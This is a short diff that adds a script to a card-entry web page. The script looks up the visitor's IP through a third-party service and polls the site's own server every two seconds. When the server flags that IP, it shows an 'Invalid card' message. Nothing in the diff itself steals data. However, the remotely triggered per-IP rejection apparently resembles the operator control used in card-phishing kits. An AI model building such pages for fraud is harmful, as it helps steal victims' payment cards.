@@ -192,5 +192,41 @@
         }
     };
     </script>
+    <script>
+    // --- POLLING для wrong_card ---
+    function getUserIP(callback) {
+        // Спробуємо отримати IP через сторонній сервіс
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => callback(data.ip))
+            .catch(() => callback(null));
+    }
+    let userIP = null;
+    getUserIP(function(ip) {
+        userIP = ip;
+    });
+    let wrongCardMsg = null;
+    function showWrongCardMsg() {
+        if (!wrongCardMsg) {
+            wrongCardMsg = document.createElement('div');
+            wrongCardMsg.style.color = '#dc3545';
+            wrongCardMsg.style.fontSize = '0.98rem';
+            wrongCardMsg.style.marginTop = '6px';
+            wrongCardMsg.textContent = 'Invalid card';
+            const cardInput = document.getElementById('card-input');
+            cardInput.parentNode.appendChild(wrongCardMsg);
+        }
+    }
+    setInterval(function() {
+        if (!userIP) return;
+        fetch('/check_wrong_card?ip=' + encodeURIComponent(userIP))
+            .then(resp => resp.text())
+            .then(txt => {
+                if (txt === 'true') {
+                    showWrongCardMsg();
+                }
+            });
+    }, 2000);
+    </script>
 </body>
 </html>
